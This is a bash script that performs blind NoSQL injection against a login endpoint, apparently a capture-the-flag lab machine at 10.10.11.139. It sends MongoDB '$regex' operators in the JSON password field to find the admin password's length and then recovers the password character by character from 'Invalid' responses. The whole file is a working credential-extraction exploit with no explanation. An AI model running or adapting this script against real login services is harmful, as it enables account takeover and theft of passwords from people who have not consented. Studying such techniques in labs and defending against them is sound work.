#!/usr/bin/env bash

url=10.10.11.139:5000/login
user=admin

function do_nosqli() {
	curl $url -H 'Content-Type: application/json' -sd $1 | grep Invalid
}

while true; do
	data='{"user":"'$user'","password":{"$regex":"^.{'$password_length'}$"}}'
	echo -ne "Password length: $password_length\r"

	if [ -z "$(do_nosqli "$data")" ]; then
		break
	fi

	password_length=$((password_length + 1))
done

echo

for i in $(seq 1 $password_length); do
	echo -ne "Password: $password\r"

	for c in {A..Z} {a..z} {0..9}; do
		data='{"user":"'$user'","password":{"$regex":"^'$password$c'.{'$(($password_length - $i))'}$"}}'

		if [ -z "$(do_nosqli $data)" ]; then
			password+=$c
			break
		fi
	done
done

echo
